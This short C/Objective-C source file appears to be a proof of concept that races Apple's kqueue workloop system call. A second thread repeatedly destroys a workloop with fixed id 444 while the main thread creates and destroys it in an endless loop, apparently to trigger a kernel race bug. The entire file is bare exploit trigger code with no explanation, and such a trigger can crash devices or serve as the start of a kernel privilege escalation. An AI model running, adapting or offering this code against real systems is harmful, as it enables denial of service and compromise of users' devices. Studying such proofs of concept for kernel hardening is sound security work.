#include <pthread.h>
#import <Foundation/Foundation.h>

volatile bool go = false;

struct kqueue_workloop_params {
    int kqwlp_version;
    int kqwlp_flags;
    UInt64 kqwlp_id;
    int kqwlp_sched_pri;
};
struct kqueue_workloop_params params = {
    .kqwlp_version = sizeof(struct kqueue_workloop_params),
    .kqwlp_flags = 0x1,
    .kqwlp_id = 444,
    .kqwlp_sched_pri = 2,
};
void race(){
    int err = -1;
    while(1){
        while(!go){};
        err = syscall(530,0x2,0, &params, sizeof(params));
    }
}

int main(int argc, char * argv[]) {
    int err = -1;
#define RACE_NUM 0x1
    pthread_t race_thread[RACE_NUM] = {};
    for(int j = 0; j< RACE_NUM;j++) {
        pthread_create(&race_thread[j], NULL, race, NULL);
    }
    sleep(2);
    while(1) {
        go = true;
        err = syscall(530, 0x1, 0, &params, sizeof(params));
        go = false;
        err = syscall(530, 0x2, 0, &params, sizeof(params));

    }
    return 0;
}
